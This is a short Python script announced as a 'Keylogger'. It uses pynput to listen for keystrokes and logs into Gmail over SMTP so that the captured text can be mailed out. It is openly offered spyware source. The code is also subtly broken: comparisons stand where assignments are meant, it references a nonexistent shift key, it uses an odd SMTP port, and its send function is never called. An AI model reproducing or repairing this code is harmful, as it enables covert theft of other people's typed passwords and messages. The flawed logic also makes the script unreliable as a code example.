import getpass
import smtplib
from pynput.keyboard import Key, Listener

print("**Welcome to Keylogger**")

email = input("Enter Email: ")
password = getpass.getpass(prompt='password:', stream=None)

server = smtplib.SMTP_SSL("smtp.gmail.com", 4545)
server.login(email, password)

full_log = ""
word =""
email_char_limit = 50

def on_press(key):
    global word
    global full_log
    global email
    global email_char_limit
    if key == Key.space or key == Key.enter:
        word == ""
        full_log == word
    elif key == Key.shift_1 or key == Key.shift_r:
        return
    elif key == Key.backspace:
        word == word[:-1]
    else:
        char = f'{key}'
        char = char[1:-1]
        word == char
    if key == Key.esc:
        return False

def send_log():
    server.sendmail(
        email,
        email,
        full_log
    )
with Listener(on_press=on_press) as listener:
    listener.join()
